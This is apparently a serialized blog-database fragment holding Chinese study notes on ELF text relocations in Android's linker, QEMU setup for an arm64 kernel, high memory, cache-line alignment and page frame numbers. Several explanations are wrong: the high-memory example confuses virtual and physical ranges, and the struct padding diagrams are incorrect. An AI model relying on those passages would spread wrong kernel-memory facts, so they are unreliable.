class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">Elf file type is <span class=\"title\">DYN</span> <span class=\"params\">(Shared object file)</span></span></span><br><span class=\"line\"><span class=\"function\">Entry point 0x0</span></span><br><span class=\"line\"><span class=\"function\">There are 8 program headers, starting at offset 52</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">Program Headers:</span></span><br><span class=\"line\"><span class=\"function\">  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align</span></span><br><span class=\"line\"><span class=\"function\">  PHDR           <span class=\"number\">0x000034</span> <span class=\"number\">0x00000034</span> <span class=\"number\">0x00000034</span> <span class=\"number\">0x00100</span> <span class=\"number\">0x00100</span> R   <span class=\"number\">0x4</span></span></span><br><span class=\"line\"><span class=\"function\">  LOAD           <span class=\"number\">0x000000</span> <span class=\"number\">0x00000000</span> <span class=\"number\">0x00000000</span> <span class=\"number\">0x02a48</span> <span class=\"number\">0x02a48</span> R E <span class=\"number\">0x1000</span></span></span><br><span class=\"line\"><span class=\"function\">  LOAD           <span class=\"number\">0x002e28</span> <span class=\"number\">0x00003e28</span> <span class=\"number\">0x00003e28</span> <span class=\"number\">0x00220</span> <span class=\"number\">0x00221</span> RW  <span class=\"number\">0x1000</span></span></span><br><span class=\"line\"><span class=\"function\">  DYNAMIC        <span class=\"number\">0x002e7c</span> <span class=\"number\">0x00003e7c</span> <span class=\"number\">0x00003e7c</span> <span class=\"number\">0x00110</span> <span class=\"number\">0x00110</span> RW  <span class=\"number\">0x4</span></span></span><br><span class=\"line\"><span class=\"function\">  NOTE           <span class=\"number\">0x000134</span> <span class=\"number\">0x00000134</span> <span class=\"number\">0x00000134</span> <span class=\"number\">0x000bc</span> <span class=\"number\">0x000bc</span> R   <span class=\"number\">0x4</span></span></span><br><span class=\"line\"><span class=\"function\">  GNU_STACK      <span class=\"number\">0x000000</span> <span class=\"number\">0x00000000</span> <span class=\"number\">0x00000000</span> <span class=\"number\">0x00000</span> <span class=\"number\">0x00000</span> RW  <span class=\"number\">0x10</span></span></span><br><span class=\"line\"><span class=\"function\">  EXIDX          <span class=\"number\">0x00210c</span> <span class=\"number\">0x0000210c</span> <span class=\"number\">0x0000210c</span> <span class=\"number\">0x001a8</span> <span class=\"number\">0x001a8</span> R   <span class=\"number\">0x4</span></span></span><br><span class=\"line\"><span class=\"function\">  GNU_RELRO      <span class=\"number\">0x002e28</span> <span class=\"number\">0x00003e28</span> <span class=\"number\">0x00003e28</span> <span class=\"number\">0x001d8</span> <span class=\"number\">0x001d8</span> RW  <span class=\"number\">0x4</span></span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\"> Section to Segment mapping:</span></span><br><span class=\"line\"><span class=\"function\">  Segment Sections...</span></span><br><span class=\"line\"><span class=\"function\">   <span class=\"number\">00</span></span></span><br><span class=\"line\"><span class=\"function\">   <span class=\"number\">01</span>     .note.android.ident .note.gnu.build-id .dynsym .dynstr .gnu.hash .hash .gnu.version .gnu.version_d .gnu.version_r .rel.dyn .rel.plt .plt .text .ARM.exidx .ARM.extab .rodata</span></span><br><span class=\"line\"><span class=\"function\">   <span class=\"number\">02</span>     .data.rel.ro .fini_array .dynamic .got .data .bss</span></span><br><span class=\"line\"><span class=\"function\">   <span class=\"number\">03</span>     .dynamic</span></span><br><span class=\"line\"><span class=\"function\">   <span class=\"number\">04</span>     .note.android.ident .note.gnu.build-id</span></span><br><span class=\"line\"><span class=\"function\">   <span class=\"number\">05</span></span></span><br><span class=\"line\"><span class=\"function\">   <span class=\"number\">06</span>     .ARM.exidx</span></span><br><span class=\"line\"><span class=\"function\">   <span class=\"number\">07</span>     .data.rel.ro .fini_array .dynamic .got</span></span><br></pre></td></tr></table></figure>\n\n\n<p>在 Android 6.0（API Level 23）之后，系统开始严格禁止 .so 文件中的 文本重定位（Text Relocations）</p>\n<ol>\n<li><p>什么是文本重定位（Text Relocations）？</p>\n<p> •    文本重定位指的是修改共享库代码段（通常被标记为只读）的内存地址，以便让其与实际加载的地址一致。<br> •    通常，编译 .so 文件时会生成位置无关代码（Position-Independent Code, PIC），这样生成的代码就能在运行时被加载到任何可用的内存地址，而无需修改代码段的内容。<br> •    但如果 .so 文件不支持位置无关代码，系统在加载时必须对其进行文本重定位，即修改代码段内的指令，以使其与实际的内存地址匹配。</p>\n</li>\n<li><p>为什么 Android 6.0 之后禁止文本重定位？</p>\n<p> •    安全性: 文本重定位需要将代码段设为可写（writable），这违反了现代操作系统的安全原则，即代码段应是只读的，以防止恶意代码注入和利用漏洞进行攻击。文本重定位带来了潜在的安全漏洞，可能被恶意程序利用进行代码注入。<br> •    性能: 文本重定位会增加启动时的开销，因为系统需要在加载 .so 文件时对其进行修改。而且，这会导致共享库无法共享相同的物理内存页面，增加内存占用，降低性能。<br> •    更好的内存管理: 禁止文本重定位有助于 Android 系统实现更高效的内存管理，避免在多进程中加载相同 .so 文件时因为重定位而导致的内存浪费。</p>\n</li>\n<li><p>禁止文本重定位后，.so 文件的加载行为</p>\n<p> •    禁止文本重定位后，系统要求 .so 文件必须是 位置无关代码（PIC），这意味着它可以加载到任何可用的内存地址，而不需要修改代码段的内容。<br> •    只要 .so 文件是用位置无关代码编译的（即 -fPIC 编译选项），它就可以在运行时加载到内存的任何地址，而不需要文本重定位。因此，Android 6.0 之后的 .so 文件并不会被加载到固定地址，而是由系统动态分配可用的内存地址。</p>\n</li>\n</ol>\n<p>文本重定向代码分析<br>这段代码来自于动态链接器的部分，主要用于处理 <strong>动态段</strong> 中的 <code>DT_TEXTREL</code> 标签。<code>DT_TEXTREL</code> 是 ELF 动态段（<code>.dynamic</code> 段）中的一个标识符，它表明该可执行文件或共享库（<code>.so</code> 文件）存在 <strong>文本重定位（text relocations）</strong>。文本重定位指的是在程序加载时，需要修改代码段（<code>.text</code> 段）中的内容来调整符号地址。</p>\n<h3 id=\"代码分析\"><a href=\"#代码分析\" class=\"headerlink\" title=\"代码分析\"></a>代码分析</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> &#123;</span></span><br><span class=\"line\">    Elf64_Sxword d_tag;     <span class=\"comment\">/* Dynamic entry type */</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">union</span> &#123;</span></span><br><span class=\"line\">        Elf64_Xword d_val;  <span class=\"comment\">/* Integer value */</span></span><br><span class=\"line\">        Elf64_Addr d_ptr;   <span class=\"comment\">/* Program virtual address */</span></span><br><span class=\"line\">    &#125; d_un;</span><br><span class=\"line\">&#125; Elf64_Dyn;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">case</span> DT_TEXTREL:</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">if</span> defined(__LP64__)</span></span><br><span class=\"line\">    <span class=\"built_in\">DL_ERR</span>(<span class=\"string\">&quot;\\&quot;%s\\&quot; has text relocations&quot;</span>, <span class=\"built_in\">get_realpath</span>());</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">else</span></span></span><br><span class=\"line\">    has_text_relocations = <span class=\"literal\">true</span>;</span><br><span class=\"line\">    <span class=\"keyword\">break</span>;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br></pre></td></tr></table></figure>\n\n<ol>\n<li><p><strong><code>case DT_TEXTREL:</code></strong>:</p>\n<ul>\n<li>这是在动态链接器中解析动态段（<code>.dynamic</code> 段）时的一个 <code>switch</code> 语句分支，处理 <code>DT_TEXTREL</code> 的场景。</li>\n<li><code>DT_TEXTREL</code> 表示该共享库或可执行文件存在需要重定位的 <code>.text</code> 段，即代码段包含绝对地址引用，加载时需要动态修改。</li>\n</ul>\n</li>\n<li><p><strong><code>#if defined(__LP64__)</code></strong>:</p>\n<ul>\n<li>这是一个 <strong>条件编译宏</strong>，用于检查当前系统是否是 <strong>64 位架构</strong>。<code>__LP64__</code> 是 GCC 或 Clang 编译器定义的一个宏，用来标识编译环境为 64 位的长指针模型（LP64 模型），即 <code>long</code> 和 <code>pointer</code> 类型在 64 位系统中为 64 位。</li>\n<li><strong>LP64 架构</strong>: 在 64 位系统上，代码中的指针和 <code>long</code> 类型通常为 64 位。64 位系统通常强制要求 <strong>代码段不可修改</strong>，因为允许修改 <code>.text</code> 段可能带来安全风险。</li>\n</ul>\n</li>\n<li><p><strong><code>DL_ERR(&quot;\\&quot;%s\\&quot; has text relocations&quot;, get_realpath());</code></strong>:</p>\n<ul>\n<li>如果程序运行在 64 位架构上，并且发现 <code>.so</code> 文件中存在 <code>DT_TEXTREL</code>，动态链接器会调用 <code>DL_ERR</code> 函数打印错误信息。这里的 <code>get_realpath()</code> 用于获取当前正在处理的共享库的真实路径，并将其作为错误信息输出。</li>\n<li>错误信息内容：<code>&quot;filename has text relocations&quot;</code>，表示当前文件存在文本重定位。</li>\n</ul>\n</li>\n<li><p><strong><code>return false;</code></strong>:</p>\n<ul>\n<li>对于 64 位系统，一旦发现 <code>.so</code> 文件有文本重定位，动态链接器立即返回 <code>false</code>，表示拒绝加载该文件。这是因为现代 64 位系统通常禁止修改 <code>.text</code> 段以确保安全性，避免代码注入等攻击。</li>\n</ul>\n</li>\n<li><p><strong><code>#else</code> 分支</strong>:</p>\n<ul>\n<li>如果程序运行在 32 位架构上（即没有定义 <code>__LP64__</code>），动态链接器不会立即拒绝加载文件，而是将 <code>has_text_relocations</code> 变量设置为 <code>true</code>。</li>\n<li>在 32 位系统上，尽管 <code>.text</code> 段的重定位被认为是不安全的，但仍然是被允许的，因此不会直接报错，而是继续加载该共享库。</li>\n</ul>\n</li>\n<li><p><strong><code>has_text_relocations = true;</code></strong>:</p>\n<ul>\n<li>在 32 位系统上，动态链接器设置一个标志 <code>has_text_relocations</code> 为 <code>true</code>，记录当前 <code>.so</code> 文件有文本重定位。在后续的加载流程中，动态链接器可能会针对这个标志执行特殊处理，比如发出警告或做额外的安全检查。</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"代码逻辑总结\"><a href=\"#代码逻辑总结\" class=\"headerlink\" title=\"代码逻辑总结\"></a>代码逻辑总结</h3><ul>\n<li><p><strong>64 位系统（<code>__LP64__</code>）</strong>:</p>\n<ul>\n<li>如果当前系统是 64 位系统，并且该 <code>.so</code> 文件存在文本重定位 (<code>DT_TEXTREL</code>)，系统会直接报错，并拒绝加载该文件。这是因为现代 64 位系统严格要求代码段不可修改，以提高安全性。</li>\n</ul>\n</li>\n<li><p><strong>32 位系统（非 <code>__LP64__</code>）</strong>:</p>\n<ul>\n<li>如果当前系统是 32 位系统，虽然存在文本重定位，动态链接器仍然允许加载该文件，但会记录 <code>has_text_relocations = true</code>，表明这个文件有文本重定位。32 位系统的安全性要求较低，历史上允许文本重定位以支持不使用位置无关代码（PIC）的库。</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"为什么-64-位系统不允许-Text-Relocations？\"><a href=\"#为什么-64-位系统不允许-Text-Relocations？\" class=\"headerlink\" title=\"为什么 64 位系统不允许 Text Relocations？\"></a>为什么 64 位系统不允许 Text Relocations？</h3><ol>\n<li><p><strong>安全性考虑</strong>:</p>\n<ul>\n<li>允许 <code>.text</code> 段可写会带来安全风险，攻击者可以利用这个机制修改代码段，进行代码注入等恶意攻击。</li>\n<li>在 64 位系统上，严禁 <code>.text</code> 段的修改可以有效防止这类攻击。</li>\n</ul>\n</li>\n<li><p><strong>现代系统的内存管理和性能优化</strong>:</p>\n<ul>\n<li>现代 64 位系统采用了更高级的内存管理和优化技术，<code>.text</code> 段通常是共享的内存页。如果允许修改 <code>.text</code> 段，会导致每个进程必须拥有自己独立的内存页，增加内存占用，破坏共享机制。</li>\n<li>禁止文本重定位有助于提高性能和减少内存占用。</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"总结-1\"><a href=\"#总结-1\" class=\"headerlink\" title=\"总结\"></a>总结</h3><p>这段代码检查动态库是否存在 <code>DT_TEXTREL</code>（文本重定位）标签。在 64 位系统中，检测到文本重定位后，动态链接器会拒绝加载该 <code>.so</code> 文件并抛出错误，而在 32 位系统中，虽然允许文本重定位，但会设置标志 <code>has_text_relocations</code> 为 <code>true</code>，以便后续做相应的处理。这种区别源于 64 位系统对安全性和性能的更高要求。</p>\n<p>#define DT_TEXTREL    22</p>\n<p>00 00 00 03</p>\n"},{"_content":"https://blog.csdn.net/thisinnocence/article/details/127931774\n安装linux内核\nqemu 脚本\n```\n#!/bin/bash\n\n~/qemu-6.2.0/build/qemu-system-aarch64 \\\n    -nographic \\\n    -M virt \\\n    -cpu cortex-a57 \\\n    -smp 2 \\\n    -m 4G \\\n    -kernel linux-6.7.12/build/arch/arm64/boot/Image \\\n    -append \"nokaslr root=/dev/ram init=/linuxrc console=ttyAMA0 console=ttyS0\" \\\n    -initrd initrd.ext4 \\\n    -fsdev local,id=fsdev0,path=/home/nuoen/linux-6.7.12/LinuxLearn,security_model=passthrough \\\n    -device virtio-9p-pci,id=fs0,fsdev=fsdev0,mount_tag=host0 \\\n    -monitor unix:/tmp/qemu-monitor-socket,server,nowait \\\n    -incoming \"exec:cat ./savefile.img\"\n```\n共享空间\n```\n/mnt # mkdir host\n/mnt # mount -t 9p -o trans=virtio,version=9p2000.L host0 /mnt/host\n```\n\n\n进入qemu\n```socat UNIX-CONNECT:/tmp/qemu-monitor-socket -```\n\n保存镜像\n```(qemu) migrate \"exec:cat > ./savefile.img\"```\n注意：保存镜像时，要先取消共享空间的挂载\n```umount /mnt/host```\n\n\n## 内存管理\n1. 高端内存（High Memory）\n\n高端内存（High Memory） 是一种相对于内核空间中的“低端内存”（Low Memory）概念的术语。它指的是一些物理内存区域，特别是在 32 位系统中，由于地址空间的限制，它们无法直接映射到内核的虚拟地址空间中。通常，高端内存是指那些超出了内核直接映射到虚拟地址空间的物理内存区域。\n\t•\t32 位系统的地址空间限制：在传统的 32 位系统中，虚拟地址空间通常只有 4GB，而其中的一部分（通常 3GB）用于用户空间，剩下的（通常 1GB）用于内核空间。由于这个限制，内核不能直接访问所有的物理内存，尤其是对于大于 1GB 的内存，无法直接映射到内核的虚拟地址空间中。因此，高端内存指的是位于内核虚拟地址空间映射范围之外的物理内存。\n\t•\t64 位系统：由于 64 位系统的地址空间极其庞大，内核几乎可以直接访问所有物理内存，因此在 64 位系统中没有高端内存的概念。\n\n2. 线性映射\n\n线性映射 是一种将物理地址空间直接映射到虚拟地址空间的方式。在这种映射方式下，物理地址与虚拟地址是等价的或者是一个固定的偏移量。例如，内核在启动时会设置一些映射，使得物理地址 0x1000 会直接映射到虚拟地址 0x1000。\n\t•\t内核的线性映射：在内核中，低端内存通常会通过线性映射被直接映射到内核虚拟地址空间中，这样内核可以直接访问这些物理内存。\n\t•\t高端内存与线性映射的关系：在 32 位系统中，高端内存并不会直接映射到内核的虚拟地址空间。也就是说，高端内存的物理页面没有通过线性映射直接映射到内核空间的虚拟地址，而需要通过其他机制（如交换、分段、分页）来访问。\n\n3. 虚拟地址与物理地址\n\n在 Linux 内核中，struct page 结构体代表物理内存页面，其中有一个 virtual 字段，它通常指向该物理页面对应的虚拟地址。\n\t•\t对于低端内存，内核可以通过线性映射将物理地址直接映射到虚拟地址，所以 virtual 字段会直接指向内核虚拟地址空间中的一个地址。\n\t•\t对于高端内存，由于内核的虚拟地址空间可能没有直接映射到物理页面，virtual 字段可能为空或指向一个特殊的虚拟地址，这个虚拟地址通常是通过一些额外的机制（如交换或者高端内存的分页）来实现访问的。\n\n4. 总结\n\t•\t高端内存：指的是那些在 32 位系统中，由于地址空间限制，不能直接映射到内核虚拟地址空间的物理内存。\n\t•\t线性映射：是一种将物理地址直接映射到虚拟地址的机制。在 32 位系统中，低端内存是线性映射的，但高端内存则无法直接映射到内核的虚拟地址空间。\n\t•\t对于高端内存，内核通过 分段 或 分页 等方式来访问这些内存区域，而不直接通过线性映射进行访问。\n\n因此，“高端内存不会线性映射到内核地址空间” 是指，高端内存的物理页面并不能像低端内存那样通过简单的线性映射直接访问，而需要通过其他机制来访问。\n\n在 32 位系统中，由于虚拟地址空间的大小限制，内核无法直接访问所有物理内存，尤其是当物理内存大于 1GB 时。这主要是因为 32 位系统的虚拟地址空间只有 4GB，而这个空间被划分为用户空间和内核空间。\n\n32 位系统的虚拟地址空间划分\n\t•\t虚拟地址空间总大小：在 32 位系统中，虚拟地址空间的总大小为 4GB（2^32）。\n\t•\t用户空间：通常使用 3GB 的地址空间（0x00000000 到 0xBFFFFFFF）。\n\t•\t内核空间：剩余的 1GB 用于内核空间（0xC0000000 到 0xFFFFFFFF）。\n\n因此，在 32 位系统中，内核最多只能直接访问 1GB 的物理内存。如果系统的物理内存大于 1GB，那么这部分内存就无法直接映射到内核虚拟地址空间中，这部分内存就属于 高端内存（High Memory）。\n\n举个例子\n\n假设一台 32 位的计算机具有 2GB 的物理内存：\n\t•\t物理内存：2GB（2^31 字节），其中包括低端内存（Low Memory）和高端内存（High Memory）。\n\t•\t低端内存：在虚拟地址空间中的前 1GB（0x00000000 到 0xBFFFFFFF），可以直接映射到内核空间。\n\t•\t高端内存：超出 1GB 的内存（0xC0000000 到 0xFFFFFFFF 之间的内存）不能直接映射到内核虚拟地址空间，因为内核空间已经满了。\n\n在这种情况下，物理内存的前 1GB（低端内存）可以通过内核的线性映射直接访问，而物理内存中超过 1GB 的部分（高端内存）则无法通过简单的线性映射直接访问。这就意味着，内核无法直接访问这些高端内存中的页面。\n\n如何访问高端内存\n\n虽然高端内存不能直接通过线性映射访问，但内核提供了其他机制来访问它：\n\t1.\t通过 vmalloc() 和 kmap() 访问：内核会通过 vmalloc() 和 kmap() 等机制将高端内存映射到内核的虚拟地址空间中，从而允许内核访问这些内存。高端内存不直接映射到内核虚拟地址空间，而是通过分页的方式进行分段映射。\n\t2.\t通过 highmem（高端内存）区访问：高端内存通常会在内核中通过 highmem 区域进行管理。内核通过特殊的内存管理函数来访问这部分内存，通常需要进行分页或其他方式来映射。\n\n为什么高端内存不能直接映射\n\n主要原因是虚拟地址空间的限制。在 32 位系统中，内核空间最大只能有 1GB，因此如果物理内存超过 1GB，剩余的内存就不能直接映射到内核空间。这就迫使内核通过特殊的分页技术来访问这些高端内存。\n\n64 位系统的改进\n\n在 64 位系统中，虚拟地址空间大大增加，内核可以直接访问大多数物理内存，无需像 32 位系统那样处理高端内存的问题。64 位系统的虚拟地址空间可以达到 2^64，几乎不再受到地址空间大小的限制，因此不再需要像在 32 位系统中那样对高端内存进行特殊处理。\n\n\n好的，让我们重新梳理一下这段代码的逻辑，并且通过一个具体的例子来深入理解它的含义和作用。\n\n背景：为什么需要按缓存行对齐\n\n在多核处理器（SMP）系统中，缓存一致性和数据访问效率非常关键。缓存行（Cache Line）是 CPU 缓存中最小的存储单位，大多数现代处理器的缓存行大小通常为 64 字节。如果一个数据结构跨越了两个或多个缓存行，那么访问该数据时就可能导致 缓存行失效（cache line ping-pong），即每个 CPU 核心都在不同的缓存行中加载同一个数据，导致性能下降。因此，将数据按缓存行对齐可以避免这个问题，确保数据尽量放置在单独的缓存行中，从而提高性能。\n\n分析这段代码的作用\n\n#if !defined(____cacheline_internodealigned_in_smp)\n#if defined(CONFIG_SMP)\n#define ____cacheline_internodealigned_in_smp \\\n    __attribute__((__aligned__(1 << (INTERNODE_CACHE_SHIFT))))\n#else\n#define ____cacheline_internodealigned_in_smp\n#endif\n#endif\n\n这段代码的目的是根据系统是否支持 SMP（对称多处理）（即是否有多个 CPU 核心）来决定是否为数据结构设置缓存行对齐属性。\n\n代码解释\n\t1.\t#if !defined(____cacheline_internodealigned_in_smp)\n这一行检查是否已经定义了宏 ____cacheline_internodealigned_in_smp。如果没有定义，才会继续定义它，避免重复定义。\n\t2.\t#if defined(CONFIG_SMP)\n这行检查是否定义了 CONFIG_SMP。CONFIG_SMP 是一个内核配置选项，表示是否启用了对称多处理（即是否有多个 CPU 核心）。\n\t•\t如果启用了 SMP（多核处理），则进行缓存行对齐的处理。\n\t•\t如果没有启用 SMP（单核系统），则不进行缓存行对齐。\n\t3.\t#define ____cacheline_internodealigned_in_smp \\\n如果启用了 SMP（即 CONFIG_SMP 被定义），则定义 ____cacheline_internodealigned_in_smp 为 __attribute__((__aligned__(1 << (INTERNODE_CACHE_SHIFT))))。\n\t•\tINTERNODE_CACHE_SHIFT 是一个宏，通常表示缓存行大小的对数。例如，如果缓存行大小是 64 字节，那么 INTERNODE_CACHE_SHIFT 就是 6，因为 64 = 2^6。\n\t•\t__attribute__((__aligned__(...))) 是 GCC 提供的一个编译器属性，表示将数据对齐到指定的字节边界。\n\t•\t1 << (INTERNODE_CACHE_SHIFT) 表示将数据对齐到 64 字节的边界。\n所以，启用 SMP 时，____cacheline_internodealigned_in_smp 宏会被定义为 __attribute__((__aligned__(64)))，这确保数据会按 64 字节对齐。\n\t4.\t#else\n如果没有启用 SMP（单核系统），则 ____cacheline_internodealigned_in_smp 不会做任何事情，即不做对齐操作。\n\t5.\t#endif\n结束条件编译语句。\n\n总结：\n\t•\tSMP（多核系统）：如果系统支持多核，____cacheline_internodealigned_in_smp 被定义为 __attribute__((__aligned__(64)))，确保数据按缓存行（64 字节）对齐，从而减少缓存失效的风险。\n\t•\t单核系统：不做缓存行对齐操作。\n\n具体例子：\n\n假设我们有一个结构体，并希望在多核处理器系统中确保它按缓存行对齐：\n\nstruct my_struct {\n    int a;\n    char b;\n    float c;\n};\n\n没有对齐的情况：\n\n在没有使用 ____cacheline_internodealigned_in_smp 时，编译器会根据结构体成员的对齐要求来确定内存布局：\n\t•\tint 通常需要对齐到 4 字节边界。\n\t•\tchar 通常对齐到 1 字节边界。\n\t•\tfloat 通常对齐到 4 字节边界。\n\n如果这个结构体没有使用缓存行对齐，内存布局可能像这样：\n\n+--------+-------+--------+--------+\n|   a    |   b   |   c    | padding|\n+--------+-------+--------+--------+\n  4 bytes   1 byte   4 bytes   3 bytes\n\n\t•\ta 占用 4 字节并对齐到 4 字节。\n\t•\tb 占用 1 字节，并且它的对齐要求为 1 字节。\n\t•\tc 占用 4 字节，并且对齐到 4 字节。\n\n为了使 c 能对齐到 4 字节，可能需要在 b 后添加 3 字节的填充。\n\n启用缓存行对齐后的情况：\n\n现在，假设启用了 ____cacheline_internodealigned_in_smp，并且系统支持 SMP（多核）。这时，结构体会按 64 字节对齐，也就是说，结构体的起始地址会对齐到 64 字节的边界。\n\n假设 INTERNODE_CACHE_SHIFT = 6，即缓存行大小为 64 字节，结构体的内存布局会变成：\n\n+-----------------------------------+\n|   Padding (64 bytes)              |\n+-----------------------------------+\n|   a   |   b   |   c   |   padding |\n+-----------------------------------+\n  4 bytes   1 byte   4 bytes   55 bytes\n\n\t•\t结构体的首地址被对齐到 64 字节的边界。\n\t•\t内存填充：由于结构体本身的大小是 12 字节，但为了保证结构体的起始地址是 64 字节的倍数，结构体会被填充到 64 字节的边界。即，结构体的起始位置可能会有 64 字节的填充。\n\n效果和意义：\n\t•\t避免缓存失效：将数据对齐到缓存行的边界可以减少跨越缓存行的访问，从而减少缓存失效。\n\t•\t性能优化：对于多核系统，避免数据跨越多个缓存行能提高内存访问效率，减少 CPU 核心间的缓存一致性问题。\n\n总结：\n\t•\t这段代码的核心目的是在 多核处理器（SMP）系统 中，将结构体的起始地址对齐到 64 字节的边界，以减少缓存一致性问题和提高访问效率。\n\t•\t按缓存行对齐确保数据结构在内存中的布局能够有效利用 CPU 缓存，避免多个 CPU 核心间由于访问同一数据而导致的缓存行失效问题。\n\n\n### 9.2\n在 Linux 内核中，“PFN”（Page Frame Number，页帧号）是用来索引物理页（physical page）的一种整数编号。下面分别解释代码里的两个概念：\n\n1. ARCH_PFN_OFFSET 是什么？\n\n在一些架构上（尤其是 ARM、MIPS 等嵌入式或移动平台），物理内存不一定从物理地址 0x00000000 开始，也可能从更高的物理地址起步（例如某些平台保留了低地址做其他映射、外设 IO 等）。\n\t•\tARCH_PFN_OFFSET 就是为了对齐“页帧号（PFN）”和实际物理地址而引入的一个“偏移量”。\n\t•\tPFN 是“物理地址 / PAGE_SIZE”的逻辑编号。如果系统的物理地址不是从 0 起步，而是从某个偏移地址开始，那么 ARCH_PFN_OFFSET 就用于在内核中对这些 PFN 进行校正。\n\n简而言之：ARCH_PFN_OFFSET = (物理内存起始地址) / PAGE_SIZE（在特定平台中可能还含有更多固定映射或保留区间导致的修正）。\n\n在大多数常见的 x86_64 PC 服务器或桌面上，ARCH_PFN_OFFSET 一般为 0；而在某些嵌入式或 ARM 平台上，这个值会是一个正整数，让内核知道第一个可用物理页帧编号实际是多少。\n\n2. pfn 是什么？\n\npfn 是 “Page Frame Number”（页帧号），用来标识系统中的第几页物理内存。\n\t•\t如果 PAGE_SIZE = 4KB，那么 PFN=0 指向物理地址 0x00000000 ~ 0x00000FFF 这一页；PFN=1 对应 0x00001000 ~ 0x00001FFF，依此类推。\n\t•\t因此 pfn 与物理地址的关系：\n\n物理地址 = pfn * PAGE_SIZE\n\n\n\t•\t内核提供了 pfn_to_page(pfn) 这样的方法，把一个 PFN 转换为对应的 struct page *，这样就能访问或操作该物理页的元数据。\n\n在这段代码里：\n\npfn = i + ARCH_PFN_OFFSET;\nif (!pfn_valid(pfn))\n    continue;\np = pfn_to_page(pfn);\n...\n\n\t•\ti 从 0 遍历到 num_physpages（即系统总共可见的物理页数），然后加上 ARCH_PFN_OFFSET 得到实际有效的 PFN。\n\t•\tpfn_valid(pfn) 检查这个 PFN 是否属于系统真正存在或可管理的物理内存区域，可能有的 PFN 范围并没有对应物理页（例如“洞”（holes）或保留区）。\n\t•\t如果是有效 PFN，再用 pfn_to_page() 拿到对应的 struct page 描述符，然后进行各种标记检查（如 PageLocked、PageDirty 等）。\n\n小结\n\t•\tARCH_PFN_OFFSET：平台/架构相关的 PFN 偏移，用于对齐实际物理地址在页帧编号体系中的起点。\n\t•\tpfn：Page Frame Number，标识物理页的编号，用于在内核中管理、索引所有物理页面。","source":"_drafts/kernelLinux.md","raw":"https://blog.csdn.net/thisinnocence/article/details/127931774\n安装linux内核\nqemu 脚本\n```\n#!/bin/bash\n\n~/qemu-6.2.0/build/qemu-system-aarch64 \\\n    -nographic \\\n    -M virt \\\n    -cpu cortex-a57 \\\n    -smp 2 \\\n    -m 4G \\\n    -kernel linux-6.7.12/build/arch/arm64/boot/Image \\\n    -append \"nokaslr root=/dev/ram init=/linuxrc console=ttyAMA0 console=ttyS0\" \\\n    -initrd initrd.ext4 \\\n    -fsdev local,id=fsdev0,path=/home/nuoen/linux-6.7.12/LinuxLearn,security_model=passthrough \\\n    -device virtio-9p-pci,id=fs0,fsdev=fsdev0,mount_tag=host0 \\\n    -monitor unix:/tmp/qemu-monitor-socket,server,nowait \\\n    -incoming \"exec:cat ./savefile.img\"\n```\n共享空间\n```\n/mnt # mkdir host\n/mnt # mount -t 9p -o trans=virtio,version=9p2000.L host0 /mnt/host\n```\n\n\n进入qemu\n```socat UNIX-CONNECT:/tmp/qemu-monitor-socket -```\n\n保存镜像\n```(qemu) migrate \"exec:cat > ./savefile.img\"```\n注意：保存镜像时，要先取消共享空间的挂载\n```umount /mnt/host```\n\n\n## 内存管理\n1. 高端内存（High Memory）\n\n高端内存（High Memory） 是一种相对于内核空间中的“低端内存”（Low Memory）概念的术语。它指的是一些物理内存区域，特别是在 32 位系统中，由于地址空间的限制，它们无法直接映射到内核的虚拟地址空间中。通常，高端内存是指那些超出了内核直接映射到虚拟地址空间的物理内存区域。\n\t•\t32 位系统的地址空间限制：在传统的 32 位系统中，虚拟地址空间通常只有 4GB，而其中的一部分（通常 3GB）用于用户空间，剩下的（通常 1GB）用于内核空间。由于这个限制，内核不能直接访问所有的物理内存，尤其是对于大于 1GB 的内存，无法直接映射到内核的虚拟地址空间中。因此，高端内存指的是位于内核虚拟地址空间映射范围之外的物理内存。\n\t•\t64 位系统：由于 64 位系统的地址空间极其庞大，内核几乎可以直接访问所有物理内存，因此在 64 位系统中没有高端内存的概念。\n\n2. 线性映射\n\n线性映射 是一种将物理地址空间直接映射到虚拟地址空间的方式。在这种映射方式下，物理地址与虚拟地址是等价的或者是一个固定的偏移量。例如，内核在启动时会设置一些映射，使得物理地址 0x1000 会直接映射到虚拟地址 